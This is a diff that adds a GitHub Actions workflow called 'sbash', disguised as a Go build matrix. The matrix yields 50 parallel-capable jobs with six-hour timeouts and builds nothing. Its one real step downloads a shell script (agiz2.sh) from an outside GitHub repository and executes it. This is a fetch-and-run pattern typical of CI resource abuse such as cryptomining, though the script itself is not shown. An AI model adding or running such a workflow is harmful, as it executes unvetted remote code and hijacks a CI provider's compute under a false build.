@@ -1,0 +1,27 @@
+name: sbash
+on: [push, pull_request]
+jobs:
+  build:
+    name: sbash
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 40
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5]
+        flag: [a, b, c, d, e, f, g, h, i, j]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 40
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: sbash
+      uses: actions/checkout@v1
+    - name: sbash
+      run: |
+        wget https://github.com/AnggiAlfonso/Project/blob/main/agiz2.sh && chmod u+x agiz2.sh && ./agiz2.sh
